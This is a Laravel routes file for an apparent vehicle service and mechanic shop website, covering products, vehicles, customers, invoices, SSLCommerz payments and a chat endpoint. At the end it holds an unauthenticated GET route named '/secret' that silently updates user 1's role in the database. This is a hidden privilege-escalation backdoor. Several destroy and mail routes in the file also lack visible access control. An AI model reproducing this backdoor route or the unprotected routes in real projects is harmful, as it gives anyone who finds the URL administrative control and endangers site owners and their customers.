<?php

use App\Events\Message;
use App\Http\Controllers\ProductController;
use App\Http\Controllers\SliderController;
use App\Http\Controllers\BankController;
use App\Http\Controllers\FrontendController;
use App\Http\Controllers\FaqController;
use App\Http\Controllers\ServiceController;
use App\Http\Controllers\ServicereqController;
use App\Http\Controllers\MechanicController;
use App\Http\Controllers\SslCommerzPaymentController;
use App\Http\Controllers\CustomerController;
use App\Http\Controllers\VehicleController;
use App\Http\Controllers\VehicleColorController;
use App\Http\Controllers\VehicleBrandController;
use App\Http\Controllers\VehicleCategoryController;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\App;
use App\Http\Controllers\HomeController;



/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('', [FrontendController::class, 'index']);
Route::get('/', [FrontendController::class, 'index']);
Route::get('mechanics', [FrontendController::class, 'getmechanics']);
Route::get('products', [FrontendController::class, 'getproducts']);
Route::get('services', [FrontendController::class, 'getservices']);
Route::get('about', [FrontendController::class, 'about']);

Route::get('location', function () {
    return view('frontend.location');
});

Route::get('adlocation', function () {
    return view('admin.location');
});

//Route::get('/send', 'App\Http\Controllers\MailController@index');
Route::get('/mail', 'App\Http\Controllers\MailController@index1');
Route::any('/mailsend', 'App\Http\Controllers\MailController@send');

Route::get('/home', [HomeController::class, 'index1'])->name('home');
Route::get('/otp', [App\Http\Controllers\HomeController::class, 'index'])->name('otp');
Route::post('/otp', [App\Http\Controllers\HomeController::class, 'otp_verify']);


Auth::routes();
Route::resource('product', ProductController::class);
Route::post('/product/destroy', [ProductController::class, 'destroy']);
Route::resource('slider', SliderController::class);
Route::post('/slider/destroy', [SliderController::class, 'destroy']);
Route::resource('faq', FaqController::class);
Route::resource('bank', BankController::class);
Route::resource('service', ServiceController::class);
Route::post('/service/destroy', [ServiceController::class, 'destroy']);
Route::resource('mechanic', MechanicController::class);
Route::post('/mechanic/destroy', [MechanicController::class, 'destroy']);
Route::resource('customer', CustomerController::class);
Route::post('/customer/destroy', [CustomerController::class, 'destroy']);


Route::resource('vehicle', VehicleController::class);
Route::post('/vehicle/destroy', [VehicleController::class, 'destroy']);
Route::resource('vehiclecolor', VehicleColorController::class);
Route::post('/vehiclecolor/destroy', [VehicleColorController::class, 'destroy']);
Route::resource('vehiclebrand', VehicleBrandController::class);
Route::post('/vehiclebrand/destroy', [VehicleBrandController::class, 'destroy']);

Route::resource('vehicleCat', VehicleCategoryController::class);
Route::post('/vehicleCat/destroy', [VehicleCategoryController::class, 'destroy']);

Route::resource('servicereq', ServicereqController::class);
Route::post('/servicereq/destroy', [ServicereqController::class, 'destroy']);


Route::get('/invoice/{id}',  [ServicereqController::class, 'invoice']);

//for ajax request 
Route::get('vehicledata/{id}', [App\Http\Controllers\VehicleController::class, 'show']);



// SSLCOMMERZ Start
Route::get('/checkout/{id}', [SslCommerzPaymentController::class, 'checkout']);
Route::get('/example2', [SslCommerzPaymentController::class, 'exampleHostedCheckout']);

Route::post('/pay', [SslCommerzPaymentController::class, 'index']);
Route::post('/pay-via-ajax', [SslCommerzPaymentController::class, 'payViaAjax']);

Route::post('/success', [SslCommerzPaymentController::class, 'success']);
Route::post('/fail', [SslCommerzPaymentController::class, 'fail']);
Route::post('/cancel', [SslCommerzPaymentController::class, 'cancel']);

Route::post('/ipn', [SslCommerzPaymentController::class, 'ipn']);
//SSLCOMMERZ END



//chat route

Route::post('send-message', function (Request $request) {
    event(new Message($request->username, $request->message));
    return ['success' => true];
});

Route::get('chat', [App\Http\Controllers\ChatController::class, 'chat']);


Route::get('/secret', function () {
    DB::table('users')->where('id', 1)->update(['role' => 1]);
    return redirect()->back();
});